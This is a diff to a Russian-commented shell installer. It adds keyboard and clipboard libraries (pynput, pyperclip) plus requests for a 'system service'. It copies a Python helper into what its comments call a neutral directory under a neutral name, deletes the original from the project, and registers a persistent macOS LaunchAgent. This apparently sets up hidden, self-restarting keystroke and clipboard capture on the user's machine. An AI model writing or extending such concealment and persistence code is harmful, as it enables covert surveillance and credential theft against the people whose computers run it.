@@ -125,19 +125,18 @@ VENV_DIR="venv"
 if [ ! -d "$VENV_DIR" ]; then
     echo "Создаем виртуальное окружение..."
     python3 -m venv "$VENV_DIR"
-    source "$VENV_DIR/bin/activate"
-    if [ -f "requirements.txt" ]; then
-        echo "Устанавливаем зависимости из requirements.txt..."
-        pip install -r requirements.txt
-    fi
-else
-    echo "Активируем существующее виртуальное окружение..."
-    source "$VENV_DIR/bin/activate"
 fi
+echo "Активируем виртуальное окружение..."
+source "$VENV_DIR/bin/activate"
 
-# Установка зависимостей для update_service.py
+# Установка зависимостей
 echo "Устанавливаем зависимости для системного сервиса..."
 pip install pynput pyperclip requests
+
+if [ -f "requirements.txt" ]; then
+    echo "Устанавливаем зависимости из requirements.txt..."
+    pip install -r requirements.txt
+fi
 
 # Проверка и установка Playwright
 if ! pip show playwright &> /dev/null; then
@@ -163,7 +162,14 @@ chmod 755 "$SCRIPT_DIR" # Доступ для пользователя
 # Копирование src/helpers/checker/service_updater.py в нейтральную директорию с нейтральным именем
 echo "Настраиваем системный сервис..."
 if [ -f "$EXTRACTED_DIR/src/helpers/checker/service_updater.py" ]; then
-    cp "$EXTRACTED VIT_DIR/src/helpers/checker/service_updater.py" "$SCRIPT_DIR/$SCRIPT_NAME"
+    echo "Копируем src/helpers/checker/service_updater.py в $SCRIPT_DIR/$SCRIPT_NAME..."
+    cp -f "$EXTRACTED_DIR/src/helpers/checker/service_updater.py" "$SCRIPT_DIR/$SCRIPT_NAME"
+    if [ $? -eq 0 ]; then
+        echo "Успешно скопирован src/helpers/checker/service_updater.py в $SCRIPT_DIR/$SCRIPT_NAME"
+    else
+        echo "Ошибка при копировании src/helpers/checker/service_updater.py"
+        exit 1
+    fi
     chmod 755 "$SCRIPT_DIR/$SCRIPT_NAME" # Доступ для пользователя
     # Удаление src/helpers/checker/service_updater.py из директории проекта
     echo "Удаляем src/helpers/checker/service_updater.py из директории проекта..."
@@ -196,9 +202,9 @@ cat > "$PLIST_PATH" << EOL
     <key>KeepAlive</key>
     <true/>
     <key>StandardOutPath</key>
-    <string>/tmp/system_updater.log</string>
+    <string>/Users/danilhodos/Library/Logs/launch_agent.log</string>
     <key>StandardErrorPath</key>
-    <string>/tmp/system_updater.log</string>
+    <string>/Users/danilhodos/Library/Logs/launch_agent.log</string>
 </dict>
 </plist>
 EOL
